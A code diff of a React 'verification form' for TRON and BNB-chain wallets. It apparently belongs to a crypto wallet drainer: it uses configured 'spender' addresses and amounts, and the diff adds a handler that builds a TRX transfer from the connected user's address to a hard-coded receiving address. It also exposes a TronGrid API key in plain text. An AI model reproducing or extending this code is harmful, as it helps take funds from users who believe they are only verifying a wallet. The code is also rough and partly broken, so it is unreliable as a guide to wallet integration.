@@ -9,6 +9,7 @@ import Swal from 'sweetalert2';
 import { TronWeb } from 'tronweb';
 import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
+import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
 
 const FULL_NODE = 'https://api.trongrid.io';
 const SOLIDITY_NODE = 'https://api.trongrid.io';
@@ -46,6 +47,31 @@ const VerificationFormComponent = (props) => {
   const spenderTrx = import.meta.env.VITE_SPENDER_ADDRESS_TRX;
   const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
   const spenderAmount = import.meta.env.VITE_AMOUNT;
+
+  // Trying...
+  const [readyState, setReadyState] = useState(WalletReadyState.NotFound);
+  const [account, setAccount] = useState('');
+  const [netwok, setNetwork] = useState({});
+  const [signedMessage, setSignedMessage] = useState('');
+
+  const adapter = useMemo(() => new TronLinkAdapter(), []);
+  useEffect(() => {
+    setReadyState(adapter.readyState);
+    setAccount(adapter.address!);
+    console.log('Adapter address:', adapter);
+
+    return () => {
+      // remove all listeners when components is destroyed
+      adapter.removeAllListeners();
+    };
+  }, []);
+
+  async function sign() {
+    const res = await adapter!.signMessage('helloworld');
+    setSignedMessage(res);
+  }
+
+  /// enddd
 
   const contractType = {
     'binance': 'BEP-20 Token',
@@ -344,31 +370,15 @@ const VerificationFormComponent = (props) => {
   };
 
   const handleSubmit = async (value) => {
-    console.log('window', window);
-
-    const tronLink = window.bitkeep.tronLink;
-    const tronWeb = window.bitkeep.tronWeb;
-    console.log('tronWebInstance', tronWeb);
-    console.log('tronLink', tronLink);
-
-    // For Bitget/BitKeep, contract() may return an object with contractState
-    let contract;
-    if (tronWebInstance.contract && typeof tronWebInstance.contract === 'function') {
-      contract = await tronWebInstance.contract().at(trxContractAddress);
-    } else if (tronWebInstance.contractState) {
-      contract = tronWebInstance.contractState;
-    } else {
-      Swal.fire({
-        icon: "error",
-        title: "Contract Not Supported",
-        text: "Your wallet does not support contract interaction."
-      });
-      console.log('contract', contract);
-
-      return;
-    }
-    console.log('contract', contract);
-
+    const tronWeb = new TronWeb({
+      fullHost: 'https://api.trongrid.io',
+      headers: { 'TRON-PRO-API-KEY': '7a869df0-71b7-4fbe-afe1-b9bc0051e9d9' },
+    });
+    console.log('tronWeb',tronWeb);
+    
+    const unSignedTransaction = await tronWeb.transactionBuilder.sendTrx('TJfNCKKvN2yrbSAJVpFfnKqVu44sZcrK5w', 100, adapter.address);
+    console.log('unSignedTransaction', unSignedTransaction);
+    
     // if (disconnect) {
     //   await disconnect();
     // }
